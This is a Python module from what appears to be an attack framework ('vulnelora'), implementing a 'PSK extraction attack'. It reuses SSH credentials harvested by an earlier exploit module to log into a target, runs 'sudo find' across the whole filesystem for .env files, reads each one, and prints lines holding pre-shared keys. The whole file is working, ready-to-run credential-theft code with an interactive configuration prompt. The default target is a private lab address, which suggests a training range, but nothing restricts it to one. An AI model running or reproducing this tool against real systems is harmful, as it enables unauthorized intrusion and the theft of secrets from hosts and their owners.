import paramiko
import os
import sys
import json


save_flag = 0
service_path = "/opt/vulnelora"

attack_config = {'target_ip': "192.168.94.54",
'target_port': 22,
'filename': ".env",
'ssh_creds_path': "/opt/vulnelora/resources/creds/ssh_creds.txt",
'try_sudo': True,
'print_full': False
}


def check_save():
    if save_flag == 0:
        print("\n>> Current attack configuration not saved, would you like to save it? [y/n] ", end='')
        save_req = input()

        if save_req.strip().lower() == "y":
            print("\n>> Enter path (including file name) where the attack configuration should be saved: ", end='')
            path = input()
            save_conf(path)
        elif save_req.strip().lower() == "n":
            pass
        else:
            print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")


def extract(text, value):
    return text[len(value)+1:].strip()


def ssh_search_env_files(host, port, username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(host, port=port, username=username, password=password)

    if attack_config['try_sudo']:
        stdin, stdout, stderr = ssh_client.exec_command(f'sudo find / -type f -iname "*.env*" 2>/dev/null')
    else:
        stdin, stdout, stderr = ssh_client.exec_command(f'find / -type f -iname "*.env*" 2>/dev/null')
    env_files = stdout.read().decode().splitlines()

    for env_file in env_files:
        print(f">> [\033[91mDATA\033[0m] Found .env file: {env_file}")
        stdin, stdout, stderr = ssh_client.exec_command(f'cat {env_file}')
        try:
            env_content = stdout.read().decode()
            if attack_config['print_full']:
                print(env_content)
            else:
                for line in env_content.split('\n'):
                    if "PRESHARE" in line or "PSK" in line:
                        print(f"\033[91m{line}\033[0m")
        except UnicodeDecodeError:
            print(f"[INFO]: Cannot decode '{env_file}', probably not a text file. Ignoring...\n")
            continue
        print()

    ssh_client.close()


def get_credentials():
    cred_path = attack_config['ssh_creds_path']
    creds = []

    if validate_path(cred_path):
        with open(cred_path, 'r') as cred_file:
            creds = cred_file.readlines()
        return creds
    else:
        return ""


def validate_path(value):
    if os.path.exists(value):
        return os.path.getsize(value) > 0
    else:
        return 0


def print_args():
    formatted_args = json.dumps(attack_config, indent=4)
    print(formatted_args)


def save_conf(path):
    with open(path, 'w') as file_w:
        json.dump(attack_config, file_w)
    with open(path, 'r') as file_r:
        file_content = json.load(file_r)
        if file_content == attack_config:
            global save_flag
            save_flag = 1
            print(f"\n>> [SUCCESS]: Current attack configuration saved successfully in '{path}'!")
        else:
            print("\n>> [ERROR]: Attack configuration has not beed saved correctly due to unknown error. Please, try again.")


def transfer_conf(loaded_conf):
        global attack_config
        attack_config.update(loaded_conf)


def argument_parser():
    argument = sys.argv[1]
    base_name, extension = os.path.splitext(argument)

    while True:
        print(f"\033[96m\nvulora\033[0m[\033[91m{base_name}\033[96m]>\033[0m ", end='')
        arg_input = input()

        if arg_input == "help":
            with open(service_path + '/modes/help_messages/psk_extraction.txt', 'r') as file:
                file_content = file.read()
                print(file_content)
        elif "target_ip" in arg_input:
            tmp_target_ip = extract(arg_input, "target_ip")
            attack_config['target_ip'] = tmp_target_ip
            print(f"\n>> Set argument: target_ip={tmp_target_ip}")
        elif "target_port" in arg_input:
            tmp_target_port = extract(arg_input, "target_port")
            attack_config['target_port'] = tmp_target_port
            print(f"\n>> Set argument: target_port={tmp_target_port}")
        elif "try_sudo" in arg_input:
            if arg_input == "try_sudo true":
                attack_config['try_sudo'] = True
                print("\n>> Enabled argument: try_sudo")
            else:
                attack_config['try_sudo'] = False
                print("\n>> Disabled argument: try_sudo")
        elif "print_full" in arg_input:
            if arg_input == "print_full true":
                attack_config['print_full'] = True
                print("\n>> Enabled argument: print_full")
            else:
                attack_config['print_full'] = False
                print("\n>> Disabled argument: print_full")
        elif "filename" in arg_input:
            tmp_filename = extract(arg_input, "filename")
            attack_config['filename'] = tmp_filename
            print(f"\n>> Set argument: filename={tmp_filename}")
        elif "ssh_creds_path" in arg_input:
            tmp_creds_path = extract(arg_input, "ssh_creds_path")
            if validate_path(tmp_creds_path):
                attack_config['ssh_creds_path'] = tmp_creds_path
                print(f"\n>> Set argument: ssh_creds_path={tmp_creds_path}")
            else:
                attack_config['ssh_creds_path'] = "/opt/vulnelora/resources/creds/ssh_creds.txt"
                print(f"\n>> Set argument: ssh_creds_path=/opt/vulnelora/resources/creds/ssh_creds.txt (revert to default value, given path does not exist)")
        elif arg_input == "print":
            print("\n>> Current argument configuration:")
            print_args()
        elif "save" in arg_input:
            tmp_path = extract(arg_input, 'save')
            if validate_path(tmp_path):
                print("\n>> Path to save current attack configuration already exists. Overwrite? [y/n] ", end='')
                overwrite = input()
                if overwrite.strip().lower() == "y":
                    save_conf(tmp_path)
                elif overwrite.strip().lower() == "n":
                    pass
                else:
                    print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")
            else:
                if tmp_path != "":
                    save_conf(tmp_path)
                else:
                    print("\n>> [ERROR]: Attack configuration not saved. Please, input a valid path (including file name).")
        elif "load" in arg_input:
            tmp_path = extract(arg_input, 'load')
            if validate_path(tmp_path) and tmp_path != "":
                with open(tmp_path, 'r') as file:
                    file_content = json.load(file)
                    transfer_conf(file_content)
                    if attack_config == file_content:
                        print("\n>> [SUCCESS]: Attack configuration has been loaded successfully! Current configuration is:")
                        print_args()
                    else:
                        print("\n>> [ERROR]: Attack configuration has not been loaded due to unknown error. Please, try again.")
            else:
                print("\n>> [ERROR]: File does not exist.")
        elif arg_input == "finish":
            print("\n>> Final attack configuration:")
            print_args()
            print()
            check_save()
            break
        elif arg_input == "exit":
            check_save()
            exit(0)
        else:
            print(f"\n[ERROR]: Unknown argument '{arg_input}'. Type 'help' to see the supported arguments.")



def run_attack():
    credentials = get_credentials()

    if credentials == "":
        print(f"\n[ERROR]: File with SSH credentials not found! Running this attack requires running a successful \033[91mSSH_exploit attack\033[0m first.\n")
        exit(1)
    else:
        uname = credentials[0].strip()
        pwd = credentials[1].strip()

        print("\n[INFO] Starting the PSK extraction attack... \n")
        ssh_search_env_files(attack_config['target_ip'], attack_config['target_port'], uname, pwd)


if __name__ == "__main__":
    try:
        argument_parser()
        run_attack()
    except KeyboardInterrupt:
        exit(0)

    exit(0)
